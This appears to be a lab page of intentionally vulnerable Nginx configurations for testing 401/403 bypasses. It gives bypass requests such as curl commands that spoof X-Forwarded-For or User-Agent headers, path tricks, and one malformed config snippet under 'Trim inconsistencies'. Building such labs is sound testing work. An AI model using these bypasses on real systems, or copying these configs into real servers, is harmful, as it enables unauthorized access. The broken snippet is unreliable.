Intentionally vulnerable Nginx/Flask configurations for testing access control bypasses (401/403)

Off-by-slash bypass

403 ▼
Blocked: {{ base }}/admin/ 403
Bypass: {{ base }}/admin 200
The deny rule matches only /admin/ prefix. The /admin variant falls back to location / and reaches the backend, which treats both paths as equivalent.
Vulnerable Configuration
location /admin/ {
    return 403;
}

location / {
    proxy_pass http://app_upstream;
}

Exact-match auth gap

401 ▼
Blocked: {{ base }}/private/ 401
Bypass: {{ base }}/private/index.html 200
Basic Auth is enforced only on exact-match = /private/. Requests to /private/index.html don't match and fall back to permissive proxy location.
Vulnerable Configuration
location = /private/ {
    auth_basic "Restricted";
    auth_basic_user_file /etc/nginx/.htpasswd;
    proxy_pass http://app_upstream;
}

location / {
    proxy_pass http://app_upstream;
}

Regex vs prefix precedence

403 ▼
Blocked: {{ base }}/static/internal/users 403
Bypass: {{ base }}/static/internal/users.json 200
Regex location ~* \.json$ overrides prefix deny rule. Requests ending in .json bypass the /static/internal restriction.
Vulnerable Configuration
location /static/internal {
    return 403;
}

location ~* \.json$ {
    proxy_pass http://app_upstream;
}

X-Forwarded-For trust

403 ▼
Blocked: {{ base }}/local/ 403
Bypass: curl -H "X-Forwarded-For: 127.0.0.1" {{ base }}/local/ 200
Access control relies on $http_x_forwarded_for, a client-controlled header. By setting X-Forwarded-For: 127.0.0.1, the request satisfies the check.
Vulnerable Configuration
location /local {
    if ($http_x_forwarded_for !~ "^127\.0\.0\.1(,|$)") {
        return 403;
    }
    proxy_pass http://app_upstream;
}

Trim inconsistencies

403 ▼
Blocked: {{ base }}/trim/ 403
Bypass: curl --request-target "$(printf '/trim\xa0')" {{ base }} 200
Proxy and backend normalize paths differently. Using non-standard trailing characters (e.g., non-breaking space) causes interpretation mismatch, bypassing the exact-match deny rule.
Vulnerable Configuration

    return 403;
}

location = /trim/ {
    return 403;
}

User-Agent allowlist

403 ▼
Blocked: {{ base }}/user_agent 403
Bypass: curl -H "User-Agent: FBps/1.0" {{ base }}/user_agent 200
Access restricted by User-Agent allowlist. Setting User-Agent: FBps/1.0 matches the regex pattern and satisfies the check, reaching the backend.
Vulnerable Configuration
map $http_user_agent $ua_allowed {
    default 0;
    ~^FBps(\b|/|$) 1;
}

location = /user_agent {
    if ($ua_allowed = 0) { 
        return 403; 
    }
    proxy_pass http://app_upstream;
}
